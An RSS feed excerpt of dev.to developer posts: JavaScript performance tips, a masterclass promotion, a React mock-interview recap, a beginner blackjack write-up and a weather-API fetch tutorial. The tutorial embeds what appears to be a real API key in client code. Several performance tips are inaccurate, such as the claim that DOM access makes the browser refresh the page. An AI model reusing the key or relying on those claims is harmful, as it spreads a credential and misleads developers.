      <title>JavaScript Tips to Improve Your Webpage Performance</title>
      <author>Mark Vassilevskiy</author>
      <pubDate>Mon, 22 Nov 2021 04:45:16 +0000</pubDate>
      <link>https://dev.to/abstract/javascript-tips-to-improve-your-webpage-performance-h26</link>
      <guid>https://dev.to/abstract/javascript-tips-to-improve-your-webpage-performance-h26</guid>
      <description>&lt;p&gt;One of the most important things, when you're building a website, is ensuring its good performance. When people visit your webpage, they don't want to wait for 10 minutes until the page (and all the images) load. In a survey, it was found that 47% of visitors expect a website to load in less than 2 seconds and 40% of visitors leave the website if it takes more than 3 seconds to load.&lt;br&gt;
Many sites are built on JavaScript and improving performance isn't one of the easiest tasks. However, I'll show you some effective ways to do it.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#1-local-variables"&gt;
  &lt;/a&gt;
  1. Local Variables
&lt;/h2&gt;

&lt;p&gt;Whenever you call a certain function, the variables that are used to define that function are stored inside. Variables can be categorized into two types.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Local variables- Variables that are defined only within themselves.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Global variables - Variables that are used throughout the script.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At the time when you're calling a function, the browser does an activity that is termed as scope lookup. With the increase in the number of scopes in the scope chain, there's also an increase in the amount of time taken to access variables that are outside the current scope.&lt;/p&gt;

&lt;p&gt;That's the reason why an engine takes a long time to access a global variable as compared to a local variable. This means that if you define most of the variables locally, then there will be a rapid decrease in the time required by the engine to search them. Hence, it will boost the overall speed of the application.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#2-webpack"&gt;
  &lt;/a&gt;
  2. Webpack
&lt;/h2&gt;

&lt;p&gt;When the size of your file increases by adding new JavaScript modules or scripts respectively, your code just gets slower and slower.&lt;/p&gt;

&lt;p&gt;Webpack is an open-source JavaScript module bundler. It is made primarily for JavaScript. Webpack creates the dependency graph using the existing module. Webpack explores the packages and creates a new package with a minimum number of files that are required to run the application.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#3-location"&gt;
  &lt;/a&gt;
  3. Location
&lt;/h2&gt;

&lt;p&gt;One of the simplest and easiest ways to improve your performance is to move your JavaScript code to the bottom of the page. Because when your page first loads, it needs texts, images, etc, and only then will it need to execute the JavaScript code.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#4-gzip-compression"&gt;
  &lt;/a&gt;
  4. Gzip Compression
&lt;/h2&gt;

&lt;p&gt;JavaScript files can be very large and that may impact the loading time of your website. Gzip is a software that can be used to compress your JavaScript file.&lt;br&gt;
When a browser requests a resource, the server compresses the response before sending it to the web browser. This software reduces the size of the JavaScript file, saves bandwidth, and accelerates the performance of the website.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#5-javascript-cache%C2%A0api"&gt;
  &lt;/a&gt;
  5. JavaScript Cache API
&lt;/h2&gt;

&lt;p&gt;The second method to increase the performance of your site is to use cache in your browser. When your browser launches your code, it repeatedly opens the same script again. If you use your cache right, it will open the already saved script the next time and the performance will improve immediately.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#6-acces-to%C2%A0dom"&gt;
  &lt;/a&gt;
  6. Acces to DOM
&lt;/h2&gt;

&lt;p&gt;The &lt;strong&gt;&lt;em&gt;DOM (Document Object Model)&lt;/em&gt;&lt;/strong&gt; is an object-oriented representation of the web page, which can be modified with a scripting language such as JavaScript. The browser has to refresh the page whenever you interact with the DOM outside the JavaScript native environment. It's good to keep DOM access to a minimum or in your web application.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;I tried to find the best ways to improve the performance of your webpage with JavaScript tips. I've been using some of these myself for over a year. And I just want you to remember that people love it when there are no lags and bugs on the webpage they're opening. And this too is an important thing.&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>webdev</category>
      <category>tutorial</category>
      <category>css</category>
    </item>
    <item>
      <title>Level up your GitHub with GitHub Actions and Kubernetes, with Sr. Principle Dev from Red Hat </title>
      <author>Saurabh Rai</author>
      <pubDate>Mon, 22 Nov 2021 03:26:03 +0000</pubDate>
      <link>https://dev.to/srbhr/level-up-your-github-with-github-actions-and-kubernetes-with-srprinciple-dev-from-red-hat-5d6h</link>
      <guid>https://dev.to/srbhr/level-up-your-github-with-github-actions-and-kubernetes-with-srprinciple-dev-from-red-hat-5d6h</guid>
      <description>&lt;h1&gt;
  &lt;a href="#watch-senior-principle-developer-karan-singh-talk-about-the-recipe-to-level-up-your-software-skills-at-git-commit-show-live-with-qampa"&gt;
  &lt;/a&gt;
  Watch Senior Principle Developer Karan Singh talk about the recipe to level up your software skills at Git Commit Show LIVE with Q&amp;amp;A!
&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Automate your workflow from idea to production.&lt;/em&gt;&lt;/strong&gt; This is the tagline of GitHub Actions, with an increasing complexity in software toolchain, GitHub Action's Pipeline has helped a lot in automating a lot of stuff... It makes it easy to automate all your software workflows, now with world-class CI/CD. Build, test, and deploy your code right from GitHub. Make code reviews, branch management, and issue triaging work the way you want.&lt;/p&gt;

&lt;p&gt;We bring an expert in this field from an Amazing Open Source organization, "Red Hat" to come up with an amazing masterclass session on GitHub Actions and DevOps. Where you can watch as well as have a live chat, face-to-face with the author to ask questions as well. &lt;/p&gt;

&lt;p&gt;Join Git Commit Show for ✳&lt;strong&gt;FREE&lt;/strong&gt;❇ here: &lt;a href="http://push.gitcommit.show/"&gt;&lt;em&gt;Link&lt;/em&gt;&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;Karan Singh is a &lt;strong&gt;Senior Principal Architect &amp;amp; Developer Evangelist at Red Hat&lt;/strong&gt;. In his role, Karan focuses on architecting and developing cloud-native composable solutions on Kubernetes. Part of his responsibilities is to enable developers and builders with rapidly changing cloud-native technologies. &lt;/p&gt;

&lt;p&gt;He holds a strong background in infrastructure, SRE, DevOps, data services, and data analytics and is also specialized in designing and building scalable and cloud-native distributed &amp;amp; event-driven systems while believing that better software deserves better architecture. &lt;/p&gt;

&lt;p&gt;He is also a published author, a frequent speaker at conferences, and an avid blogger at &lt;a href="https://ksingh7.medium.com"&gt;https://ksingh7.medium.com&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--fQTGo_i6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8agzn6mb9kzx04u190tz.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--fQTGo_i6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8agzn6mb9kzx04u190tz.png" alt="Git Commit Show Masterclass" width="880" height="880"&gt;&lt;/a&gt;&lt;br&gt;
Join Git Commit Show for ✳&lt;strong&gt;FREE&lt;/strong&gt;❇ here: &lt;a href="http://push.gitcommit.show/"&gt;&lt;em&gt;Link&lt;/em&gt;&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;Also we have a Discord Server: &lt;a href="https://discord.gg/JFWP8c2gPG"&gt;&lt;em&gt;Link&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>devops</category>
      <category>github</category>
      <category>docker</category>
      <category>kubernetes</category>
    </item>
    <item>
      <title>React Mock Interview </title>
      <author>Oscar Ore</author>
      <pubDate>Mon, 22 Nov 2021 03:13:41 +0000</pubDate>
      <link>https://dev.to/oscarore007/react-mock-interview-4a2h</link>
      <guid>https://dev.to/oscarore007/react-mock-interview-4a2h</guid>
      <description>&lt;p&gt;Interviews are always a nerve-wracking thing to do! You spend hours upon hours studying Data Structures and Algorithms, Youtube top programming interview questions and answers, and think of all of the possible questions the interviewer can ask you. &lt;/p&gt;

&lt;p&gt;Thanks to Flatiron School, I was able to prepare for a mock interview to go through these same trials and tribulations as my peers. I am writing this blog post to encourage my fellow aspiring software developers to take every interview opportunity that you can, because just like programming, practice makes perfect. Here is how my mock interview went.&lt;/p&gt;

&lt;p&gt;1) The Meet - n - Greet &lt;br&gt;
During the first 10-15 minutes of my mock interview, I introduced myself to my interviewer and told him my story of becoming a software developer. This was a key point for me in my interview process because I can demonstrate my soft skills and how my previous work experience as a sales rep in the tech world can benefit my transition to a developer position. Focus on your strong points, and really show your passion for software development and eagerness to learn. In other words, SELL YOURSELF! &lt;/p&gt;

&lt;p&gt;2) Technical Q&amp;amp;A&lt;br&gt;&lt;br&gt;
During the technical Q&amp;amp;A portion of my interview, I was asked a handful of React questions. Here were some of the questions that I was asked:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;What is React? &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;What are the differences between functional and class components?&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;What is the virtual DOM? How does react use the virtual DOM to render what the user sees? &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Explain React state and props.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;What is prop drilling in React?&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Make sure that your answers are clear and straight to the point. The interviewer told me the worst thing a candidate can do is ramble on about a topic that does not relate to the questions at hand. Simply say, " I do not know the answer to the question". Now here is where you can differentiate yourself: don't be afraid to ask questions! These are the times that interviewers want to know how you think. &lt;/p&gt;

&lt;p&gt;3) Live Coding &lt;/p&gt;

&lt;p&gt;My live coding challenge was to build the following:&lt;br&gt;
Build a React Component that displays the given data&lt;br&gt;
with the functionality of sorting that data and adding rows.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import "./styles.css";
import Row from "./row";
import React, { useState } from "react";

// Build a React Component that displays the given data
// with the functionality of sorting that data and adding rows.

const DATA = [
  { id: 0, name: "John", email: "john@gmail.com" },
  { id: 1, name: "Jane", email: "jane@gmail.com" },
  { id: 2, name: "Joe", email: "joe@gmail.com" }
];

export default function App() {
  const [name, SetName] = useState("");
  const [users, SetUsers] = useState(DATA);

  const handleChange = (event) =&amp;gt; {
    SetName(event.target.value);
  };

  const handleSubmit = (event) =&amp;gt; {
    const newUser = {
      id: users.length,
      name: name,
      email: `${name}@gmail.com`
    };
    SetUsers([...users, newUser]);
  };


  return (
    &amp;lt;div className="App"&amp;gt;
      {users.map((user) =&amp;gt; (
        &amp;lt;Row key={user.id} name={user.name} email={user.email} /&amp;gt;
      ))}
      &amp;lt;input type="text" value={name} onChange={handleChange} /&amp;gt;
      &amp;lt;button onClick={handleSubmit}&amp;gt; Push Here! &amp;lt;/button&amp;gt;
    &amp;lt;/div&amp;gt;
  );
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now, here is what my row.js folder looks like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import React from "react";

function Row(props) {
  return (
    &amp;lt;h1&amp;gt;
      {props.name}, {props.email}
    &amp;lt;/h1&amp;gt;
  );
}

export default Row;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;All the user has to do is enter their name, and that would autogenerate a gmail account for the user. This is taken care of by the handleSubmit method above. After time was up, my instructor encouraged me to add on the ability to edit and delete users as well. &lt;/p&gt;

&lt;p&gt;Stay tuned for more! &lt;/p&gt;

&lt;p&gt;Happy Coding! &lt;/p&gt;

</description>
      <category>react</category>
      <category>interview</category>
      <category>career</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Tackling a Problem From a Beginner's Perspective</title>
      <author>Robert Duggan</author>
      <pubDate>Mon, 22 Nov 2021 01:16:48 +0000</pubDate>
      <link>https://dev.to/rduggan/tackling-a-problem-from-a-beginners-perspective-ic6</link>
      <guid>https://dev.to/rduggan/tackling-a-problem-from-a-beginners-perspective-ic6</guid>
      <description>&lt;h2&gt;
  &lt;a href="#what-do-i-do"&gt;
  &lt;/a&gt;
  What do I do?
&lt;/h2&gt;

&lt;p&gt;We often see technical blog posts from experienced developers sharing their insights from years of coding, hardly ever from someone just starting out. The hardest part of beginning a project is actually imagining a project to start, at least for me. So, I sought inspiration from the internet. (codecademy's final project)&lt;/p&gt;

&lt;p&gt;Codecademy's Final Project in python was to create some terminal program. This was my first project completely from scratch. Of the options at codecademy I decided on the blackjack game. Making a blackjack game seemed fairly challenging but within my grasp. So I got to work. BTW, you can find the source code &lt;a href="https://github.com/i-rduggan/blackjack_game/blob/main/blackjack_and_hookers.py"&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-do-i-do-now"&gt;
  &lt;/a&gt;
  What do I do, now?
&lt;/h2&gt;

&lt;p&gt;I began by establishing what I would actually need to play blackjack in real life. That being a deck of cards and some people to play with. I didn't have people to play with so I had to settle for some computer opponents of which I have not implemented any kind of AI for yet. &lt;/p&gt;

&lt;p&gt;To create the players I took an input from the user about how many people were playing. I then created an empty dictionary of players and filled it with players and an empty hand. ({player 1: [], player 2: []})&lt;/p&gt;

&lt;p&gt;I read that blackjack at casinos uses upwards of 6 decks! This is the bulk of the problem that I made for myself. If I had just used 1 deck I could have made it work, but I'm stubborn and wanted to make it as much like the real thing as I could. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#this-is-where-the-fun-begins"&gt;
  &lt;/a&gt;
  This is where the fun begins!
&lt;/h2&gt;

&lt;p&gt;I started this off by creating an empty list and then filling it with numbers from 1 to 52 * 6 + 1. There may be other ways to do this, but I wanted to pop cards out so I didn't use the same card twice. However, I knew that I wouldn't be able to do anything with any numbers above 52, as that's all that's in a deck. So I created a function to reduce the cards into a usable format to use for later.&lt;/p&gt;

&lt;p&gt;Now that I have my decks and my fake people, I could start working out how to get fake cards into fake people's hands. I did this by using the function I created that reduces the cards input values to 1 - 52 on a random number generated from the length of the cards list - 1, and then pulling it out and appending it to the players dictionary.&lt;/p&gt;

&lt;p&gt;After I got cards into people's hands, I began to work on figuring out just what those cards were (as of right now they are just some number between 1 and 52). My strategy here was to first define the suits, then figure out the faces. It actually took me quite a while to land on a method I liked (the simplest). I just assigned 1 - 13 as diamonds, 14-26 clubs, and so on. As for the face cards, I created a function to reduce the cards given to it to land between 1 and 13, that way I didn't have to have 16 if statements. Although, in retrospect the time I spent making that work was probably much longer than it would have taken to just manually line them out. &lt;/p&gt;

&lt;p&gt;In blackjack, the cards numbered 1 - 10 are worth their respective value, however each face card is worth 10 and the ace is worth 11. All I have right now in the players' hands are 2 numbers between 1 and 52. This isn't helpful. Luckily, I made a function before to reduce my if statements on finding the card faces. I utilized it here to loop through each hand and condense it to a value between 1 and 11 to get added up later to decide the winner.&lt;/p&gt;

&lt;p&gt;Obviously, we would want the user to know what cards are in their hand, otherwise how can they make smart decisions? I created a little function to list the cards from the dictionary, combined with the other functions I made to reduce the values and find the faces, to output to the user what was in their hand. I then gave him the option to hit or to stand.&lt;/p&gt;

&lt;p&gt;If the user selected hit, I pulled another random card from my card list and did my magic to it and put it in the users hand. If the sum of the cards in their hand was greater than 21, I let him know that he lost. Then I rubbed it in his face by telling him who won. By this point, I'd gotten lazy. The user only gets 2 chances to hit, and the computer players aren't making any decisions. I summed everyone up and compared it to the highest known so far and output that to the console. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;Thanks for coming to my TED talk about spending 4 days on a blackjack game that takes 4 seconds to play.&lt;/p&gt;

</description>
      <category>beginners</category>
      <category>programming</category>
      <category>python</category>
    </item>
    <item>
      <title>Consulting Temperature API with JS</title>
      <author>Walter Nascimento</author>
      <pubDate>Mon, 22 Nov 2021 00:22:44 +0000</pubDate>
      <link>https://dev.to/walternascimentobarroso/consulting-temperature-api-with-js-4ibg</link>
      <guid>https://dev.to/walternascimentobarroso/consulting-temperature-api-with-js-4ibg</guid>
      <description>&lt;p&gt;&lt;a href="https://medium.com/walternascimentobarroso-pt/consultando-api-de-temperatura-com-js-90f293657e5e"&gt;[Clique aqui para ler em português]&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let’s make a query for a temperature api using javascript fetch&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#code"&gt;
  &lt;/a&gt;
  Code
&lt;/h2&gt;

&lt;p&gt;First let’s create the interface, we’ll do something simple, using just HTML.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;div&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;span&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"city"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;span&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"temperature"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To present the data we have a &lt;code&gt;div&lt;/code&gt; with two spans, one to represent the city and the other to represent the temperature.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;CITY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;city&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;TEMPERATURE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;temperature&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;URL_MAIN&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;https://api.openweathermap.org/data/2.5/weather&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;API_KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;8f57cb746c4c1d4b48b7f35eba6f6230&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;UNITS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;metric&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nb"&gt;navigator&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;geolocation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getCurrentPosition&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;loadUrl&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;loadUrl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;pos&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;lat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;pos&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;coords&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;latitude&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;long&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;pos&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;coords&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;longitude&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;URL_MAIN&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;?lat=&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;lat&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;amp;lon=&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;long&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;amp;units=&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;UNITS&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;amp;APPID=&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;API_KEY&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nx"&gt;fetchApi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;fetchApi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;json&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;temperature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;toFixed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nx"&gt;CITY&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;innerText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;:`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nx"&gt;TEMPERATURE&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;innerText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;`&lt;/span&gt;&lt;span class="p"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;temperature&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; ºC`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;First of all you need to be registered on the &lt;a href="https://openweathermap.org/"&gt;openweathermap&lt;/a&gt; site, when you register you will have access to the key so just change the parameters in the js code.&lt;/p&gt;

&lt;p&gt;In the constants we have city, a constant with the span &lt;code&gt;city&lt;/code&gt; element and one with the span &lt;code&gt;temperature&lt;/code&gt; element, then we have three support constants for the query, &lt;code&gt;URL_MAIN&lt;/code&gt; (where the url of the &lt;a href="https://openweathermap.org/"&gt;openweathermap&lt;/a&gt; site is), &lt;code&gt;API_KEY&lt;/code&gt; (where the access key is) and &lt;code&gt;UNITS&lt;/code&gt; (where is the type of unit that will be returned from the api, for more information see the website).&lt;/p&gt;

&lt;p&gt;To start, the browser’s own &lt;code&gt;geolocation&lt;/code&gt; api is called, and with it the &lt;code&gt;loadUrl&lt;/code&gt; function is called.&lt;/p&gt;

&lt;p&gt;In the &lt;code&gt;loadUrl&lt;/code&gt; function we get the coordinate that came from the &lt;code&gt;geolocation&lt;/code&gt; api and we set the &lt;code&gt;url&lt;/code&gt; to consult the api.&lt;/p&gt;

&lt;p&gt;In the &lt;code&gt;fetchApi&lt;/code&gt; function a query is made for the &lt;code&gt;url&lt;/code&gt; that was created and when we have the api response it is displayed on the page with the &lt;code&gt;innerText&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;ready simple like that.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#demo"&gt;
  &lt;/a&gt;
  Demo
&lt;/h2&gt;

&lt;p&gt;See below for the complete working project.&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/WalterNascimento/embed/vYyZrXj?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;&lt;em&gt;if you can't see it &lt;a href="https://codepen.io/WalterNascimento/pen/vYyZrXj"&gt;click here&lt;/a&gt; and see the final result&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#youtube"&gt;
  &lt;/a&gt;
  Youtube
&lt;/h2&gt;

&lt;p&gt;If you prefer to watch it, see the development on youtube.&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/FaE0hJRLQ8g"&gt;
&lt;/iframe&gt;
&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#thanks-for-reading"&gt;
  &lt;/a&gt;
  Thanks for reading!
&lt;/h2&gt;

&lt;p&gt;If you have any questions, complaints or tips, you can leave them here in the comments. I will be happy to answer!&lt;/p&gt;

&lt;p&gt;😊😊 See you later! 😊😊&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#support-me"&gt;
  &lt;/a&gt;
  Support Me
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://www.youtube.com/channel/UCXm0xRtDRrdnvkW24WmkBqA"&gt;Youtube - WalterNascimentoBarroso&lt;/a&gt;&lt;br&gt;
&lt;a href="https://github.com/walternascimentobarroso"&gt;Github - WalterNascimentoBarroso&lt;/a&gt;&lt;br&gt;
&lt;a href="https://codepen.io/walternascimento/"&gt;Codepen - WalterNascimentoBarroso&lt;/a&gt;&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>html</category>
      <category>api</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Chain of Responsibility e ASP.Net Core</title>
      <author>William Santos</author>
